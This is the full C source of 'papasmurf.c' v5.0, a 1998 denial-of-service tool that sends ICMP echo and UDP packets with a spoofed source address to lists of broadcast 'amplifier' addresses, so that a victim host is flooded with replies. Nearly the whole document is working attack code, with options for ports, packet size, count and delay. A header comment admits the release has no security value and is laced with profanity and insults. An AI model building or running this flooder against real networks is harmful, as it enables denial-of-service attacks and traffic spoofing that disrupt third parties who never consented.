

/*
 *  (papa)smurf.c v5.0 by TFreak - http://www.rootshell.com
 *
 *  A year ago today I made what remains the questionable decision of 
 *  releasing my program 'smurf', a program which uses broadcast "amplifiers"
 *  to turn an icmp flood into an icmp holocaust, into the hands of packet
 *  monkeys, script kiddies and all round clueless idiots alike.  Nine months
 *  following, a second program 'fraggle', smurfs udp cousin, was introducted
 *  into their Denial of Service orgy.  This brings us to today, July 28,
 *  1998, one year after my first "mistake".  The result, proof that history
 *  does repeat itself and a hybrid of the original programs.
 *
 *  First may I say that I in no way take credit for "discovering" this.
 *  There is no doubt in my mind that this idea was invisioned long before
 *  I was even sperm -- I merely decided to do something about it.  Secondly,
 *  if you want to hold me personally responsible for turning the internet
 *  into a larger sesspool of crap than it already is, then may I take this 
 *  opportunity to deliver to you a message of the utmost importance -- "Fuck
 *  you".  If I didn't write it, someone else would have.
 *
 *  I must admit that there really is no security value for me releasing this
 *  new version.  In fact, my goals for the version are quite silly. First,
 *  I didn't like the way my old code looked, it was ugly to look at and it
 *  did some stupid unoptimized things.  Second, it's smurfs one year 
 *  birthday -- Since I highly doubt anyone would have bought it a cake, I
 *  thought I would do something "special" to commemorate the day.
 *
 *  Hmm, I am starting to see why I am known for my headers (wage eats
 *  playdough!).
 *
 *  Well, I guess this wouldn't be the same if I did not include some sort
 *  of shoutouts, so here goes...
 *
 *  A hearty handshake to...
 *
 *    o  MSofty, pbug, Kain -- No matter which path each of you decides to 
 *       take in the future, I will always look back upon these days as one 
 *       of the most enjoyable, memorable and thought-provoking experiences 
 *       of my life.  I have nothing but the highest degree of respect for 
 *       each of you, and I value your friendship immensely.  Here's to 
 *       living, learning and laughing -- Cheers gentlemen. --Dan
 *    o  Hi JoJo!
 *    o  morbid and his grandam barbiegirl gino styles, yo.
 *    o  The old #havok crew.
 *    o  Pharos,silph,chris@unix.org,Viola,Vonne,Dianora,fyber,silitek,
 *       brightmn,Craig Huegen,Dakal,Col_Rebel,Rick the Temp,jenni`,Paige,
 *       RedFemme,nici,everlast,and everyone else I know and love.
 *
 *  A hearty enema using 15.0mol/L HCl to...
 *    
 *    o  #Conflict.  Perhaps you are just my scapegoat of agression, but you
 *       all really need to stop flooding efnet servers/taking over irc 
 *       channels/mass owning networks running old qpoppers and get a
 *       fucking life.
 *    o  BR.  It wouldn't be the same without you in here, but to be honest
 *       you really aren't worth the space in the already way-to-bloated
 *       header, nor the creative energy of me coming up with an intricate
 *       bash that you will never understand anyway.  Shrug, hatred disguises
 *       itself as apathy with time.
 *
 *  I feel like I'm writing a fucking essay here...
 *
 *  To compile: "gcc -DLINUX -o smurf5 papasmurf.c" if your LINUXish.
 *                                 or just
 *              "gcc -o smurf5 papasmurf.c" if your BSDish.
 *  
 *  Old linux kernels won't have BSD header support, so this may not compile.
 *  If you wish a linux-only version, do it yourself, or mail 
 *  tfreak@jaded.net, and I might lend you mine.
 *
 *  And most importantly, please don't abuse this.  If you are going to do
 *  anything with this code, learn from it.
 *
 *  I remain,
 *
 *  TFreak.
 *
 */

/* End of Hideously Long Header */
                            
#include <stdio.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <arpa/inet.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <time.h>
#ifdef LINUX 
#define __FAVOR_BSD				/* should be __FAVOUR_BSD ;) */
#ifndef _USE_BSD
#define _USE_BSD
#endif
#endif
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netinet/udp.h>

#ifdef LINUX
#define FIX(n) 	htons(n)
#else
#define FIX(n) 	(n)
#endif

struct smurf_t
{
    struct sockaddr_in sin;			/* socket prot structure */
    int s;					/* socket */
    int udp, icmp;				/* icmp, udp booleans */
    int rnd;					/* Random dst port boolean */
    int psize;					/* packet size */
    int num;					/* number of packets to send */
    int delay;					/* delay between (in ms) */
    u_short dstport[25+1];			/* dest port array (udp) */
    u_short srcport;				/* source port (udp) */
    char *padding;				/* junk data */
};

/* function prototypes */
void usage (char *);
u_long resolve (char *);
void getports (struct smurf_t *, char *);
void smurficmp (struct smurf_t *, u_long);
void smurfudp (struct smurf_t *, u_long, int);
u_short in_chksum (u_short *, int);


int 
main (int argc, char *argv[])
{
    struct smurf_t sm;
    struct stat st;
    u_long bcast[1024];
    char buf[32];
    int c, fd, n, cycle, num = 0, on = 1; 
    FILE *bcastfile;

    /* shameless self promotion banner */
    fprintf(stderr, "\n(papa)smurf.c v5.0 by TFreak\n\n");

    if (argc < 3) 
        usage(argv[0]);

    /* set defaults */
    memset((struct smurf_t *) &sm, 0, sizeof(sm));
    sm.icmp = 1;
    sm.psize = 64;
    sm.num = 0;
    sm.delay = 10000;
    sm.sin.sin_port = htons(0);
    sm.sin.sin_family = AF_INET;
    sm.srcport = 0;
    sm.dstport[0] = 7;

    /* resolve 'source' host, quit on error */
    sm.sin.sin_addr.s_addr = resolve(argv[1]);

    /* open the broadcast file */
    if ((bcastfile = fopen(argv[2], "r")) == NULL)
    {
        perror("Opening broadcast file");
        exit(-1);
    }

    /* parse out options */
    optind = 3;
    while ((c = getopt(argc, argv, "rRn:d:p:P:s:S:f:")) != -1)
    {
	switch (c)
	{
	    /* random dest ports */
	    case 'r':
		sm.rnd = 1;
		break;

	    /* random src/dest ports */
	    case 'R':
		sm.rnd = 1;
                sm.srcport = 0;
		break;

	    /* number of packets to send */
	    case 'n':
		sm.num = atoi(optarg);
		break;

	    /* usleep between packets (in ms) */
	    case 'd':
		sm.delay = atoi(optarg);
		break;

	    /* multiple ports */
	    case 'p':
		if (strchr(optarg, ',')) 
		    getports(&sm, optarg);
		else
		    sm.dstport[0] = (u_short) atoi(optarg);
		break;

	    /* specify protocol */
	    case 'P':
		if (strcmp(optarg, "icmp") == 0)
		{
		    /* this is redundant */
		    sm.icmp = 1;
		    break;
		}
		if (strcmp(optarg, "udp") == 0)
		{
		    sm.icmp = 0;
		    sm.udp = 1;
		    break;
		}
		if (strcmp(optarg, "both") == 0)
		{
		    sm.icmp = 1;
		    sm.udp = 1;
		    break;
		}

		puts("Error: Protocol must be icmp, udp or both");
		exit(-1);

	    /* source port */
	    case 's':
		sm.srcport = (u_short) atoi(optarg);
		break;

	    /* specify packet size */
	    case 'S':
		sm.psize = atoi(optarg);
		break;

	    /* filename to read padding in from */
	    case 'f':
		/* open and stat */
		if ((fd = open(optarg, O_RDONLY)) == -1)
		{
		    perror("Opening packet data file");
		    exit(-1);
		}
		if (fstat(fd, &st) == -1)
		{
		    perror("fstat()");
		    exit(-1);
		}

		/* malloc and read */
		sm.padding = (char *) malloc(st.st_size);
		if (read(fd, sm.padding, st.st_size) < st.st_size)
		{
		    perror("read()");
		    exit(-1);
		}

		sm.psize = st.st_size;
		close(fd);
		break;

            default:
                usage(argv[0]);
        }
    } /* end getopt() loop */
	    
    /* create packet padding if neccessary */
    if (!sm.padding)
    {
	sm.padding = (char *) malloc(sm.psize);
	memset(sm.padding, 0, sm.psize);
    }

    /* create the raw socket */
    if ((sm.s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) == -1)
    {
	perror("Creating raw socket (are you root?)");
	exit(-1);
    }

    /* Include IP headers ourself (thanks anyway though) */
    if (setsockopt(sm.s, IPPROTO_IP, IP_HDRINCL, (char *)&on, sizeof(on)) == -1)
    {
	perror("setsockopt()");
	exit(-1);
    }

    /* read in our broadcasts and store them in our array */
    while (fgets(buf, sizeof buf, bcastfile) != NULL)
    {
	char *p;
	int valid;

        /* skip over comments/blank lines */
        if (buf[0] == '#' || buf[0] == '\n') continue;

        /* get rid of newline */ 
        buf[strlen(buf) - 1] = '\0';

        /* check for valid address */
        for (p = buf, valid = 1; *p != '\0'; p++)
        {
            if ( ! isdigit(*p) && *p != '.' ) 
            {
                fprintf(stderr, "Skipping invalid ip %s\n", buf);
                valid = 0;
                break;
            }
        }

        /* if valid address, copy to our array */
        if (valid)
        {
	    bcast[num] = inet_addr(buf);
            num++;
	    if (num == 1024)
		break;
        }
    } /* end bcast while loop */

    /* seed our random function */
    srand(time(NULL) * getpid());

    /* wee.. */
    for (n = 0, cycle = 0; n < sm.num || !sm.num; n++)
    {
	if (sm.icmp)
	    smurficmp(&sm, bcast[cycle]);

	if (sm.udp)
	{
	    int x;
	    for (x = 0; sm.dstport[x] != 0; x++)
	        smurfudp(&sm, bcast[cycle], x);
	}

	/* quick nap */
	usleep(sm.delay);

	/* cosmetic psychadelic dots */
	if (n % 50 == 0)
	{
	    printf(".");
	    fflush(stdout);
	}

	cycle = (cycle + 1) % num;
    }

    exit(0);
}


void 
usage (char *s)
{
    fprintf(stderr,
            "usage: %s <source host> <broadcast file> [options]\n"
	    "\n"
	    "Options\n"
	    "-p:	Comma separated list of dest ports (default 7)\n"
	    "-r:	Use random dest ports\n"
	    "-R:	Use random src/dest ports\n"
	    "-s:	Source port (0 for random (default))\n"
	    "-P:	Protocols to use.  Either icmp, udp or both\n"
	    "-S:	Packet size in bytes (default 64)\n"
	    "-f:	Filename containg packet data (not needed)\n"
	    "-n:	Num of packets to send (0 is continuous (default))\n"
	    "-d:	Delay inbetween packets (in ms) (default 10000)\n"
	    "\n", s);
    exit(-1);
}


u_long 
resolve (char *host)
{
    struct in_addr in;
    struct hostent *he;

    /* try ip first */
    if ((in.s_addr = inet_addr(host)) == -1)
    {
	/* nope, try it as a fqdn */
	if ((he = gethostbyname(host)) == NULL)
	{
	    /* can't resolve, bye. */
            herror("Resolving victim host");
	    exit(-1);
	}

	memcpy( (caddr_t) &in, he->h_addr, he->h_length);
    }

    return(in.s_addr);
}
	

void 
getports (struct smurf_t *sm, char *p)
{
    char tmpbuf[16];
    int n, i;

    for (n = 0, i = 0; (n < 25) && (*p != '\0'); p++, i++)
    {
	if (*p == ',')
	{
            tmpbuf[i] = '\0';
	    sm->dstport[n] = (u_short) atoi(tmpbuf);
	    n++; i = -1;
	    continue;
	}

	tmpbuf[i] = *p;
    }
    tmpbuf[i] = '\0';
    sm->dstport[n] = (u_short) atoi(tmpbuf);
    sm->dstport[n + 1] = 0;
}


void
smurficmp (struct smurf_t *sm, u_long dst)
{
    struct ip *ip;
    struct icmp *icmp;
    char *packet;

    int pktsize = sizeof(struct ip) + sizeof(struct icmp) + sm->psize;

    packet = malloc(pktsize);
    ip = (struct ip *) packet;
    icmp = (struct icmp *) (packet + sizeof(struct ip));

    memset(packet, 0, pktsize);

    /* fill in IP header */
    ip->ip_v = 4;
    ip->ip_hl = 5;
    ip->ip_tos = 0;
    ip->ip_len = FIX(pktsize);
    ip->ip_ttl = 255;
    ip->ip_off = 0;
    ip->ip_id = FIX( getpid() );
    ip->ip_p = IPPROTO_ICMP;
    ip->ip_sum = 0;
    ip->ip_src.s_addr = sm->sin.sin_addr.s_addr;
    ip->ip_dst.s_addr = dst;

    /* fill in ICMP header */
    icmp->icmp_type = ICMP_ECHO;
    icmp->icmp_code = 0;
    icmp->icmp_cksum = htons(~(ICMP_ECHO << 8));	/* thx griffin */

    /* send it on its way */
    if (sendto(sm->s, packet, pktsize, 0, (struct sockaddr *) &sm->sin,
        sizeof(struct sockaddr)) == -1)
    {
	perror("sendto()");
	exit(-1);
    }

    free(packet);					/* free willy! */
}


void
smurfudp (struct smurf_t *sm, u_long dst, int n)
{
    struct ip *ip;
    struct udphdr *udp;
    char *packet, *data;

    int pktsize = sizeof(struct ip) + sizeof(struct udphdr) + sm->psize;

    packet = (char *) malloc(pktsize);
    ip = (struct ip *) packet;
    udp = (struct udphdr *) (packet + sizeof(struct ip));
    data = (char *) (packet + sizeof(struct ip) + sizeof(struct udphdr));

    memset(packet, 0, pktsize);
    if (*sm->padding)
        memcpy((char *)data, sm->padding, sm->psize);

    /* fill in IP header */
    ip->ip_v = 4;
    ip->ip_hl = 5;
    ip->ip_tos = 0;
    ip->ip_len = FIX(pktsize);
    ip->ip_ttl = 255;
    ip->ip_off = 0;
    ip->ip_id = FIX( getpid() );
    ip->ip_p = IPPROTO_UDP;
    ip->ip_sum = 0;
    ip->ip_src.s_addr = sm->sin.sin_addr.s_addr;
    ip->ip_dst.s_addr = dst;

    /* fill in UDP header */
    if (sm->srcport) udp->uh_sport = htons(sm->srcport);
    else udp->uh_sport = htons(rand());
    if (sm->rnd) udp->uh_dport = htons(rand());
    else udp->uh_dport = htons(sm->dstport[n]);
    udp->uh_ulen = htons(sizeof(struct udphdr) + sm->psize);
//    udp->uh_sum = in_chksum((u_short *)udp, sizeof(udp));

    /* send it on its way */
    if (sendto(sm->s, packet, pktsize, 0, (struct sockaddr *) &sm->sin,
        sizeof(struct sockaddr)) == -1)
    {
	perror("sendto()");
	exit(-1);
    }

    free(packet);				/* free willy! */
}


u_short
in_chksum (u_short *addr, int len)
{
    register int nleft = len;
    register u_short *w = addr;
    register int sum = 0;
    u_short answer = 0;

    while (nleft > 1) 
    {
        sum += *w++;
        nleft -= 2;
    }

    if (nleft == 1) 
    {
        *(u_char *)(&answer) = *(u_char *)w;
        sum += answer;
    }

    sum = (sum >> 16) + (sum + 0xffff);
    sum += (sum >> 16);
    answer = ~sum;
    return(answer);
}

/* EOF */
